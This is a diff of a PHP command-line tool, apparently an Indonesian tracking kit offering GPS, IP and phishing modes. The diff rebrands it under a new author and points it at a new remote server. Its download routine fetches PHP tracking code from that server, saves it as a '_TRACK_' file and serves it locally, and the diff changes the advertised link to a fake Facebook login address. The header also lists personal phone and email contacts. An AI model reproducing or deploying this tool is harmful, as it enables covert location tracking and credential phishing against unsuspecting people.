@@ -1,20 +1,20 @@
 <?php 
 /*
-	Author 	: Brilly4n
-	Team 	: { IndoSec }
+	Author 	: DaVe.K12
+	Team 	: { Anonymous }
 	Tools 	: Information Gathering
-	Fanspage: https://www.facebook.com/IndoSecOfficial
+	Fanspage: https://www.facebook.com/
 				{ OpenSourceCode }
 */
 /*
 	Configuration
 */
-$version 	= '1.0.2';
+$version 	= '1.0.19';
 $random 	= rand(123456789, 6);
-$url 		= 'https://brad.josebernard.com/index/';
+$url 		= 'https://www.ScriptHacking12.com/index/';
 error_reporting(0);
 {
-	$cek = file_get_contents('https://brad.josebernard.com/index/version.lst');
+	$cek = file_get_contents('https://www.ScriptHacking12.com/index/version.lst');
 	$cek2 = explode("\n", $cek);
 	if ($cek2[0] == $version) {
 		echo "\n[-] Tidak Ada Pembaruan \n\n";
@@ -39,9 +39,9 @@ function tampil()
   | || | | |  _| (_) | |_| | (_| | |_| | | |
  |___|_| |_|_|  \___/ \____|\__,_|\__|_| |_| v.".$version."
        => Information Gathering <=                                        
-Author   : Brilly4n Gates => { IndoSec }
-Contact  : 085230516559 - timtam.rpl@gmail.com
-FansPage : https://www.facebook.com/IndoSecOfficial/
+Author   : Dave Kgw => */- Anonymous -/*
+Contact  : 0896 Sisanya Cari Sendiri - daveamben4@gmail.com
+FansPage : https://https://www.facebook.com/ld.profile1000098661657117
 	--GPS  --IP  --PHISING
  > ";
 }
@@ -65,15 +65,15 @@ function download($random, $url, $opt, $port)
 	curl_setopt($curl, CURLOPT_HEADER, false);
 	$data = curl_exec($curl);
 	curl_close($curl);
-	echo "\n[+] Downloading ";
+	echo "\n[+] Tunggu ";
 	touch($opt.'_TRACK_'.$random.'.php');
 	$fp = fopen($opt.'_TRACK_'.$random.'.php', 'w');
 	fwrite($fp, $data);
 	fclose($fp);
 	echo "\n[+] Membuka File...";
-	echo "\n\n[+] Buka Browser => : http://localhost:".$port;
-	// run di localhost
-	system('php -S localhost:'.$port.' '.$opt.'_TRACK_'.$random.'.php');
+	echo "\n\n[+] Buka Browser => : https://m.facebook.com/login/:".$port;
+	// run di facebook.com
+	system('php -S facebook.com:'.$port.' '.$opt.'_TRACK_'.$random.'.php');
 }
 tampil();
 $pilih = trim(fgets(STDIN));
@@ -181,7 +181,7 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 		sleep(3);
 	}
 }elseif($pilih == '--PHISING'){
-	echo "\n\n[-] Masih Di Bikin Bozzzz !!! \n\n";
+	echo "\n\n[-] Tunggu Update Terbaru Dari Dave !!! \n\n";
 }elseif($pilih == 'exit'){
 	exit();
 }else{
